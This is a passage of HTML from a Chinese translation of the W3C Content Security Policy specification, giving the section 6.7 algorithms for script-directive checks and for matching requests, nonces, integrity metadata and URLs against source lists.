                    href="#directive-post-request-check" id="ref-for-directive-post-request-check①⑧">后请求检查</a> 和 <a
                    data-link-type="dfn" href="#directive-initialization" id="ref-for-directive-initialization④">初始化</a>
                钩子，以便将自己整合到 Fetch 和 HTML 中。</p>
            <h3 class="heading settled" data-level="6.7" id="matching-algorithms"><span class="secno">6.7. </span><span
                    class="content">匹配算法</span><a class="self-link" href="#matching-algorithms"></a></h3>
            <h4 class="heading settled" data-level="6.7.1" id="script-checks"><span class="secno">6.7.1. </span><span
                    class="content">脚本指令检查</span><a class="self-link" href="#script-checks"></a></h4>
            <h5 class="heading settled algorithm" data-algorithm="Script directives pre-request check"
                data-level="6.7.1.1" id="script-pre-request"><span class="secno">6.7.1.1. </span><span
                    class="content">脚本指令的预请求检查</span><a class="self-link" href="#script-pre-request"></a></h5>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤②">请求</a> <var>request</var>，一个<a data-link-type="dfn"
                    href="#directives" id="ref-for-directives②⑧">指令</a> <var>directive</var>，和一个<a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑦">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>如果<var>request</var>的<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-destination"
                            id="ref-for-concept-request-destination④">目标</a>是<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#request-destination-script-like"
                            id="ref-for-request-destination-script-like①">类似脚本</a>：</p>
                    <ol>
                        <li data-md>
                            <p>如果执行<a href="#match-nonce-to-source-list">§ 6.7.2.3 nonce 与源列表是否匹配？</a>
                                在<var>request</var>的<a data-link-type="dfn"
                                    href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                                    id="ref-for-concept-request-nonce-metadata⑤">加密 nonce 元数据</a>和此指令的<a
                                    data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤②">值</a>上，结果是"<code>匹配</code>"，返回"<code>允许</code>"。</p>
                        <li data-md>
                            <p>如果执行<a href="#match-integrity-metadata-to-source-list">§ 6.7.2.4 完整性元数据与源列表是否匹配？</a>
                                在<var>request</var>的<a data-link-type="dfn"
                                    href="https://fetch.spec.whatwg.org/#concept-request-integrity-metadata"
                                    id="ref-for-concept-request-integrity-metadata">完整性元数据</a>和此指令的<a
                                    data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤③">值</a>上，结果是"<code>匹配</code>"，返回"<code>允许</code>"。</p>
                        <li data-md>
                            <p>如果<var>directive</var>的<a data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤④">值</a>包含一个<a data-link-type="dfn"
                                    href="#source-expression" id="ref-for-source-expression⑤">源表达式</a>，其为对"<a
                                    data-link-type="grammar" href="#grammardef-strict-dynamic"
                                    id="ref-for-grammardef-strict-dynamic"><code>'strict-dynamic'</code></a>"的<a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive⑤">ASCII 大小写不敏感</a>匹配：</p>
                            <ol>
                                <li data-md>
                                    <p>如果<var>request</var>的<a data-link-type="dfn"
                                            href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata"
                                            id="ref-for-concept-request-parser-metadata①">解析器元数据</a>是<a
                                            data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted"
                                            id="ref-for-parser-inserted①">"解析器插入的"</a>，返回"<code>阻止</code>"。</p>
                                    <p>否则，返回"<code>允许</code>"。</p>
                                    <p class="note" role="note"><span class="marker">注意：</span> "<a
                                            data-link-type="grammar" href="#grammardef-strict-dynamic"
                                            id="ref-for-grammardef-strict-dynamic①"><code>'strict-dynamic'</code></a>"
                                        在<a href="#strict-dynamic-usage">§ 8.2 "'strict-dynamic'" 的用法</a>中有更详细的说明。</p>
                            </ol>
                        <li data-md>
                            <p>如果执行<a href="#match-request-to-source-list">§ 6.7.2.5 请求是否与源列表匹配？</a>
                                在<var>request</var>、<var>directive</var>的<a data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤⑤">值</a>和<var>policy</var>上，结果是"<code>不匹配</code>"，返回"<code>阻止</code>"。
                            </p>
                    </ol>
                <li data-md>
                    <p>返回"<code>允许</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="Script directives post-request check"
                data-level="6.7.1.2" id="script-post-request"><span class="secno">6.7.1.2. </span><span
                    class="content">脚本指令的后请求检查</span><a class="self-link" href="#script-post-request"></a></h5>
            <p>此指令的<a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①⑨">后请求检查</a>如下：</p>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤③">请求</a> <var>request</var>，一个<a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑥">响应</a>
                <var>response</var>，一个<a data-link-type="dfn" href="#directives" id="ref-for-directives②⑨">指令</a>
                <var>directive</var>，和一个<a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑥⑧">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>如果<var>request</var>的<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-destination"
                            id="ref-for-concept-request-destination⑤">目标</a>是<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#request-destination-script-like"
                            id="ref-for-request-destination-script-like②">类似脚本</a>：</p>
                    <ol>
                        <li data-md>
                            <p>如果执行<a href="#match-nonce-to-source-list">§ 6.7.2.3 nonce 与源列表是否匹配？</a>
                                在<var>request</var>的<a data-link-type="dfn"
                                    href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                                    id="ref-for-concept-request-nonce-metadata⑥">加密 nonce 元数据</a>和此指令的<a
                                    data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤⑥">值</a>上，结果是"<code>匹配</code>"，返回"<code>允许</code>"。</p>
                        <li data-md>
                            <p>如果执行<a href="#match-integrity-metadata-to-source-list">§ 6.7.2.4 完整性元数据与源列表是否匹配？</a>
                                在<var>request</var>的<a data-link-type="dfn"
                                    href="https://fetch.spec.whatwg.org/#concept-request-integrity-metadata"
                                    id="ref-for-concept-request-integrity-metadata①">完整性元数据</a>和此指令的<a
                                    data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤⑦">值</a>上，结果是"<code>匹配</code>"，返回"<code>允许</code>"。</p>
                        <li data-md>
                            <p>如果<var>directive</var>的<a data-link-type="dfn" href="#directive-value"
                                    id="ref-for-directive-value⑤⑧">值</a>包含"<a data-link-type="grammar"
                                    href="#grammardef-strict-dynamic"
                                    id="ref-for-grammardef-strict-dynamic②"><code>'strict-dynamic'</code></a>"：</p>
                            <ol>
                                <li data-md>
                                    <p>如果<var>request</var>的<a data-link-type="dfn"
                                            href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata"
                                            id="ref-for-concept-request-parser-metadata②">解析器元数据</a>不是<a
                                            data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted"
                                            id="ref-for-parser-inserted②">"解析器插入的"</a>，返回"<code>允许</code>"。</p>
                                    <p>否则，返回"<code>阻止</code>"。</p>
                            </ol>
                        <li data-md>
                            <p>如果执行<a href="#match-response-to-source-list">§ 6.7.2.6 响应是否与源列表匹配？</a>
                                在<var>response</var>、<var>request</var>、<var>directive</var>的<a data-link-type="dfn"
                                    href="#directive-value"
                                    id="ref-for-directive-value⑤⑨">值</a>和<var>policy</var>上，结果是"<code>不匹配</code>"，返回"<code>阻止</code>"。
                            </p>
                    </ol>
                <li data-md>
                    <p>返回"<code>允许</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.7.2" id="matching-urls"><span class="secno">6.7.2. </span><span
                    class="content">URL 匹配</span><a class="self-link" href="#matching-urls"></a></h4>
            <h5 class="heading settled algorithm" data-algorithm="Does request violate policy?" data-level="6.7.2.1"
                id="does-request-violate-policy"><span class="secno">6.7.2.1. </span><span class="content">
                    <var>request</var> 是否违反 <var>policy</var>? </span><a class="self-link"
                    href="#does-request-violate-policy"></a></h5>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤④">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⑨">策略</a>
                <var>policy</var>，如果请求违反了策略，此算法将返回被违反的 <a data-link-type="dfn" href="#directives"
                    id="ref-for-directives③⓪">指令</a>，否则返回 "<code>Does Not Violate</code>"。
            </p>
            <ol>
                <li data-md>
                    <p>如果 <var>request</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request-initiator"
                            id="ref-for-concept-request-initiator①">发起者</a> 是 "<code>prefetch</code>"，则执行 <a
                            href="#does-resource-hint-violate-policy">§ 6.7.2.2 资源提示请求是否违反策略？</a>，返回结果。</p>
                <li data-md>
                    <p>令 <var>violates</var> 为 "<code>Does Not Violate</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate②⑨">对于每个</a> <var>policy</var> 的 <var>directive</var>：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>result</var> 为执行 <var>directive</var> 的 <a data-link-type="dfn"
                                    href="#directive-pre-request-check"
                                    id="ref-for-directive-pre-request-check①⑧">预请求检查</a> 在 <var>request</var> 和
                                <var>policy</var> 上的结果。
                            </p>
                        <li data-md>
                            <p>如果 <var>result</var> 为 "<code>Blocked</code>"，则将 <var>violates</var> 设为
                                <var>directive</var>。
                            </p>
                    </ol>
                <li data-md>
                    <p>返回 <var>violates</var>。</p>
            </ol>
            <h5 class="heading settled" data-level="6.7.2.2" id="does-resource-hint-violate-policy"><span
                    class="secno">6.7.2.2. </span><span class="content">资源提示 <var>request</var> 是否违反 <var>policy</var>?
                </span><a class="self-link" href="#does-resource-hint-violate-policy"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤⑤">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦⓪">策略</a>
                <var>policy</var>，如果资源提示请求违反了所有策略，此算法将返回默认的 <a data-link-type="dfn" href="#directives"
                    id="ref-for-directives③①">指令</a>，否则返回 "<code>Does Not Violate</code>"。
            </p>
            <ol>
                <li data-md>
                    <p>令 <var>defaultDirective</var> 为 <var>policy</var> 的第一个 <a data-link-type="dfn" href="#directives"
                            id="ref-for-directives③②">指令</a>，其 <a data-link-type="dfn" href="#directive-name"
                            id="ref-for-directive-name①⑦">名称</a> 为 "<code>default-src</code>"。</p>
                <li data-md>
                    <p>如果 <var>defaultDirective</var> 不存在，返回 "<code>Does Not Violate</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③⓪">对于每个</a> <var>policy</var> 的 <var>directive</var>：</p>
                    <ol>
                        <li data-md>
                            <p>令 <var>result</var> 为执行 <var>directive</var> 的 <a data-link-type="dfn"
                                    href="#directive-pre-request-check"
                                    id="ref-for-directive-pre-request-check①⑨">预请求检查</a> 在 <var>request</var> 和
                                <var>policy</var> 上的结果。
                            </p>
                        <li data-md>
                            <p>如果 <var>result</var> 为 "<code>Allowed</code>"，返回 "<code>Does Not Violate</code>"。</p>
                    </ol>
                <li data-md>
                    <p>返回 <var>defaultDirective</var>。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="Does nonce match source list?" data-level="6.7.2.3"
                id="match-nonce-to-source-list"><span class="secno">6.7.2.3. </span><span class="content">
                    <var>nonce</var> 是否匹配 <var>源列表</var>? </span><a class="self-link"
                    href="#match-nonce-to-source-list"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤⑥">请求</a> 的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                    id="ref-for-concept-request-nonce-metadata⑦">加密 nonce 元数据</a> <var>nonce</var> 和一个 <a
                    data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①②">源列表</a> <var>source
                    list</var>，如果 nonce 匹配列表中的一个或多个源表达式，此算法返回 "<code>Matches</code>"，否则返回 "<code>Does Not Match</code>"：
            </p>
            <ol>
                <li data-md>
                    <p class="assertion">断言：<var>source list</var> 不为 null。</p>
                <li data-md>
                    <p>如果 <var>nonce</var> 是空字符串，返回 "<code>Does Not Match</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③①">对于每个</a> <var>source list</var> 的 <var>expression</var>：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>expression</var> 匹配 <a data-link-type="grammar" href="#grammardef-nonce-source"
                                    id="ref-for-grammardef-nonce-source④"><code>nonce-source</code></a> 语法，且
                                <var>nonce</var> 与 <var>expression</var> 的 <a data-link-type="grammar"
                                    href="#grammardef-base64-value"
                                    id="ref-for-grammardef-base64-value④"><code>base64-value</code></a> 部分<a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#string-is"
                                    id="ref-for-string-is">相同</a>，返回 "<code>Matches</code>"。
                            </p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Does Not Match</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="Does integrity metadata match source list?"
                data-level="6.7.2.4" id="match-integrity-metadata-to-source-list"><span class="secno">6.7.2.4.
                </span><span class="content"><var>integrity metadata</var> 是否匹配 <var>源列表</var>? </span><a
                    class="self-link" href="#match-integrity-metadata-to-source-list"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤⑦">请求</a> 的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-integrity-metadata"
                    id="ref-for-concept-request-integrity-metadata②">完整性元数据</a> <var>integrity metadata</var> 和一个 <a
                    data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①③">源列表</a> <var>source
                    list</var>，如果完整性元数据匹配列表中的一个或多个源表达式，则此算法返回 "<code>Matches</code>"，否则返回 "<code>Does Not Match</code>"：
            </p>
            <ol>
                <li data-md>
                    <p class="assertion">断言：<var>source list</var> 不为 null。</p>
                <li data-md>
                    <p>令 <var>integrity expressions</var> 为 <var>source list</var> 中符合 <a data-link-type="grammar"
                            href="#grammardef-hash-source" id="ref-for-grammardef-hash-source④">hash-source</a> 语法的 <a
                            data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑥">源表达式</a> 的集合。
                    </p>
                <li data-md>
                    <p>如果 <var>integrity expressions</var> 为空，返回 "<code>Does Not Match</code>"。</p>
                <li data-md>
                    <p>令 <var>integrity sources</var> 为在 <var>integrity metadata</var> 上执行 <a
                            href="https://www.w3.org/TR/SRI/#parse-metadata"><cite>SRI</cite> § 3.3.3 解析元数据</a> 算法的结果。<a
                            data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a></p>
                <li data-md>
                    <p>如果 <var>integrity sources</var> 为 "<code>no metadata</code>" 或为空集，返回
                        "<code>Does Not Match</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③②">对于每个</a> <var>integrity sources</var> 的 <var>source</var>：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>integrity expressions</var> 中不包含一个 <a data-link-type="dfn"
                                    href="#source-expression" id="ref-for-source-expression⑦">源表达式</a>，其 <a
                                    data-link-type="grammar" href="#grammardef-hash-algorithm"
                                    id="ref-for-grammardef-hash-algorithm①">哈希算法</a> 与 <var>source</var> 的 <a
                                    data-link-type="grammar" href="#grammardef-hash-algorithm"
                                    id="ref-for-grammardef-hash-algorithm②">哈希算法</a> 是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                                    id="ref-for-ascii-case-insensitive⑥">ASCII 不区分大小写</a> 匹配的，且其 <a
                                    data-link-type="grammar" href="#grammardef-base64-value"
                                    id="ref-for-grammardef-base64-value⑤">base64-value</a> 与 <var>source</var> 的
                                <code>base64-value</code> <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#string-is" id="ref-for-string-is①">相同</a>，则返回
                                "<code>Does Not Match</code>"。
                            </p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Matches</code>"。</p>
            </ol>
            <p class="note" role="note"><span class="marker">注意：</span> 此处仅验证 <var>integrity metadata</var> 是否是
                <var>source list</var> 中 <a data-link-type="grammar" href="#grammardef-hash-source"
                    id="ref-for-grammardef-hash-source⑤">hash-source</a> 源的非空子集。我们依赖浏览器对子资源完整性 <a
                    data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a>
                的执行，以在响应时阻止不匹配的资源。
            </p>
            <h5 class="heading settled algorithm" data-algorithm="Does request match source list?" data-level="6.7.2.5"
                id="match-request-to-source-list"><span class="secno">6.7.2.5. </span><span
                    class="content"><var>request</var> 是否匹配 <var>源列表</var>? </span><a class="self-link"
                    href="#match-request-to-source-list"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑤⑧">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="#source-lists" id="ref-for-source-lists①④">源列表</a> <var>source list</var>，以及一个 <a
                    data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑦①">策略</a> <var>policy</var>，此算法返回在 <var>request</var> 的
                <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-current-url"
                    id="ref-for-concept-request-current-url③">当前URL</a>、<var>source list</var>、<var>policy</var> 的 <a
                    data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin③">self-origin</a> 和
                <var>request</var> 的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-redirect-count"
                    id="ref-for-concept-request-redirect-count">重定向计数</a> 上执行 <a
                    href="#match-url-to-source-list">§ 6.7.2.7 URL 是否匹配源列表中的原点和重定向计数？</a> 的结果。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> 这通常用于 <a data-link-type="dfn" href="#directives"
                    id="ref-for-directives③③">指令</a>的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check②⓪">预请求检查</a> 算法中，以验证给定的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑤⑨">请求</a> 是否合理。
            </p>
            <h5 class="heading settled algorithm" data-algorithm="Does response to request match source list?"
                data-level="6.7.2.6" id="match-response-to-source-list"><span class="secno">6.7.2.6. </span><span
                    class="content"><var>response</var> 对 <var>request</var> 是否匹配 <var>源列表</var>？</span><a
                    class="self-link" href="#match-response-to-source-list"></a></h5>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request⑥⓪">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="#source-lists" id="ref-for-source-lists①⑤">源列表</a> <var>source list</var>，以及一个 <a
                    data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑦②">策略</a> <var>policy</var>，此算法返回在 <var>response</var> 的
                <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url"
                    id="ref-for-concept-response-url③">URL</a>、<var>source list</var>、<var>policy</var> 的 <a
                    data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin④">self-origin</a> 和
                <var>request</var> 的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request-redirect-count"
                    id="ref-for-concept-request-redirect-count①">重定向计数</a> 上执行 <a
                    href="#match-url-to-source-list">§ 6.7.2.7 URL 是否匹配源列表中的原点和重定向计数？</a> 的结果。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> 这通常用于 <a data-link-type="dfn" href="#directives"
                    id="ref-for-directives③④">指令</a>的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check②⓪">请求后检查</a> 算法中，以验证给定的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑦">响应</a> 是否合理。
            </p>
            <h5 class="heading settled algorithm" data-algorithm="URL 是否匹配源列表中的表达式及重定向计数？" data-level="6.7.2.7"
                id="match-url-to-source-list"><span class="secno">6.7.2.7. </span><span class="content"> <var>url</var>
                    是否匹配 <var>source list</var> 中的表达式及 <var>redirect count</var>？
                </span><a class="self-link" href="#match-url-to-source-list"></a></h5>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑨">URL</a></code>
                <var>url</var>，一个 <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑥">源列表</a>
                <var>source list</var>，一个 <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-origin"
                    id="ref-for-concept-origin①">来源</a>
                <var>origin</var>，以及一个数字 <var>redirect count</var>，此算法如果 <var>url</var> 匹配 <var>source list</var>
                中的一个或多个源表达式则返回 "<code>Matches</code>"，否则返回 "<code>Does Not Match</code>"：
            </p>
            <ol>
                <li data-md>
                    <p class="assertion">断言：<var>source list</var> 不为 null。</p>
                <li data-md>
                    <p>如果 <var>source list</var> <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#list-is-empty" id="ref-for-list-is-empty①">为空</a>，返回
                        "<code>Does Not Match</code>"。</p>
                <li data-md>
                    <p>如果 <var>source list</var> 的 <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#list-size" id="ref-for-list-size①">大小</a>为 1，且
                        <var>source list</var>[0] 是与字符串 "<code>'none'</code>" 的 <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                            id="ref-for-ascii-case-insensitive⑦">ASCII 大小写不敏感</a>匹配，返回 "<code>Does Not Match</code>"。
                    </p>
                    <p class="note" role="note"><span class="marker">注意：</span>空的源列表（即没有值的指令：<code>script-src</code>，与
                        <code>script-src host1</code> 不同）等同于包含 <code>'none'</code> 的源列表，并且不会匹配任何 URL。
                    </p>
                    <p class="note" role="note"><span class="marker">注意：</span>当存在其他源表达式时，<code>'none'</code>
                        关键字没有效果。即，列表 « <code>'none'</code> » 不匹配任何 URL。然而，列表 « <code>'none'</code>,
                        <code>https://example.com</code> » 将匹配 <code>https://example.com/</code>。
                    </p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③③">对于每一个</a> <var>source list</var> 中的 <var>expression</var>：
                    </p>
                    <ol>
                        <li data-md>
                            <p>如果 <a href="#match-url-to-source-expression"
                                    id="ref-for-match-url-to-source-expression①">§ 6.7.2.8 URL 是否匹配来源中的表达式及重定向计数？</a> 对
                                <var>url</var>、<var>expression</var>、<var>origin</var> 和 <var>redirect count</var> 执行后返回
                                "<code>Matches</code>"，则返回 "<code>Matches</code>"。
                            </p>
                    </ol>
                <li data-md>
                    <p>返回 "<code>Does Not Match</code>"。</p>
            </ol>
            <h5 class="heading settled dfn-paneled algorithm" data-algorithm="url 是否匹配 origin 中的表达式及重定向次数？"
                data-dfn-type="dfn" data-export data-level="6.7.2.8"
                data-lt="Does url match expression in origin with redirect count?" id="match-url-to-source-expression">
                <span class="secno">6.7.2.8. </span><span class="content">
                    <var>url</var> 是否匹配 <var>origin</var> 中的 <var>expression</var> 及 <var>redirect count</var>？
                </span><a class="self-link" href="#match-url-to-source-expression"
                    id="ref-for-match-url-to-source-expression②"></a>
            </h5>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url①⓪">URL</a></code>
                <var>url</var>，
                一个 <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑧">源表达式</a>
                <var>expression</var>，
                一个 <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-origin"
                    id="ref-for-concept-origin②">origin</a> <var>origin</var>，
                和一个数字 <var>redirect count</var>，
                此算法将返回 "<code>Matches</code>" 如果 <var>url</var> 与 <var>expression</var> 匹配，
                否则返回 "<code>Does Not Match</code>"。
            </p>
            <p class="note" role="note"><span class="marker">注意：</span> <var>origin</var> 是相对于其应解析 <var>expression</var>
                的资源的 <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-origin"
                    id="ref-for-concept-origin③">origin</a>。
                "<code>'self'</code>" 例如，在不同的上下文中会有不同的含义。</p>
            <ol>
                <li data-md>
                    <p>如果 <var>expression</var> 是字符串 "*"，并且满足以下条件之一，则返回 "<code>Matches</code>"：</p>
                    <ol>
                        <li data-md>
                            <p><var>url</var> 的 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#concept-url-scheme"
                                    id="ref-for-concept-url-scheme③">scheme</a> 是 <a data-link-type="dfn"
                                    href="https://fetch.spec.whatwg.org/#http-scheme" id="ref-for-http-scheme③">HTTP(S)
                                    scheme</a>。</p>
                        <li data-md>
                            <p><var>url</var> 的 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#concept-url-scheme"
                                    id="ref-for-concept-url-scheme④">scheme</a> 与 <var>origin</var> 的 <a
                                    data-link-type="dfn"
                                    href="https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme"
                                    id="ref-for-concept-origin-scheme">scheme</a> 相同。</p>
                    </ol>
                    <p class="note" role="note"><span class="marker">注意：</span> 此逻辑意味着要允许来自非 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#http-scheme" id="ref-for-http-scheme④">HTTP(S)
                            scheme</a> 的资源，
                        必须明确指定它（例如：
                        <code>default-src * data: custom-scheme-1: custom-scheme-2:</code>），
                        或者受保护资源必须从相同的 scheme 加载。
                    </p>
                <li data-md>
                    <p>如果 <var>expression</var> 匹配 <a data-link-type="grammar" href="#grammardef-scheme-source"
                            id="ref-for-grammardef-scheme-source②"><code>scheme-source</code></a> 或 <a
                            data-link-type="grammar" href="#grammardef-host-source"
                            id="ref-for-grammardef-host-source②"><code>host-source</code></a> 语法：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>expression</var> 有一个 <a data-link-type="grammar" href="#grammardef-scheme-part"
                                    id="ref-for-grammardef-scheme-part②"><code>scheme-part</code></a>，并且它不 <a
                                    data-link-type="dfn" href="#scheme-part-match"
                                    id="ref-for-scheme-part-match"><code>scheme-part</code> 匹配</a> <var>url</var> 的 <a
                                    data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme"
                                    id="ref-for-concept-url-scheme⑤">scheme</a>，则返回 "<code>Does Not Match</code>"。
                            </p>
                        <li data-md>
                            <p>如果 <var>expression</var> 匹配 <a data-link-type="grammar" href="#grammardef-scheme-source"
                                    id="ref-for-grammardef-scheme-source③"><code>scheme-source</code></a> 语法，
                                则返回 "<code>Matches</code>"。</p>
                    </ol>
                <li data-md>
                    <p>如果 <var>expression</var> 匹配 <a data-link-type="grammar" href="#grammardef-host-source"
                            id="ref-for-grammardef-host-source③"><code>host-source</code></a> 语法：</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>url</var> 的 <code
                                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host">host</a></code>
                                为空，则返回 "<code>Does Not Match</code>"。</p>
                        <li data-md>
                            <p>如果 <var>expression</var> 没有 <a data-link-type="grammar" href="#grammardef-scheme-part"
                                    id="ref-for-grammardef-scheme-part③"><code>scheme-part</code></a>，并且
                                <var>origin</var> 的 <a data-link-type="dfn"
                                    href="https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme"
                                    id="ref-for-concept-origin-scheme①">scheme</a> 不 <a data-link-type="dfn"
                                    href="#scheme-part-match" id="ref-for-scheme-part-match①"><code>scheme-part</code>
                                    匹配</a> <var>url</var> 的 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#concept-url-scheme"
                                    id="ref-for-concept-url-scheme⑥">scheme</a>，
                                则返回 "<code>Does Not Match</code>"。
                            </p>
                            <p class="note" role="note"><span class="marker">注意：</span> 与上面的 <a data-link-type="grammar"
                                    href="#grammardef-scheme-part"
                                    id="ref-for-grammardef-scheme-part④"><code>scheme-part</code></a> 一样，
                                我们允许将无 scheme 的 <a data-link-type="grammar" href="#grammardef-host-source"
                                    id="ref-for-grammardef-host-source④"><code>host-source</code></a> 表达式从不安全的 scheme
                                升级到安全的 scheme。</p>
                        <li data-md>
                            <p>如果 <var>expression</var> 的 <a data-link-type="grammar" href="#grammardef-host-part"
                                    id="ref-for-grammardef-host-part①"><code>host-part</code></a> 不 <a
                                    data-link-type="dfn" href="#host-part-match"
                                    id="ref-for-host-part-match"><code>host-part</code> 匹配</a> <var>url</var> 的 <code
                                    class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host①">host</a></code>，
                                则返回 "<code>Does Not Match</code>"。</p>
                        <li data-md>
                            <p>如果存在 <var>expression</var> 的 <a data-link-type="grammar" href="#grammardef-port-part"
                                    id="ref-for-grammardef-port-part①"><code>port-part</code></a>，则令
                                <var>port-part</var> 为其值，否则为 null。
                            </p>
                        <li data-md>
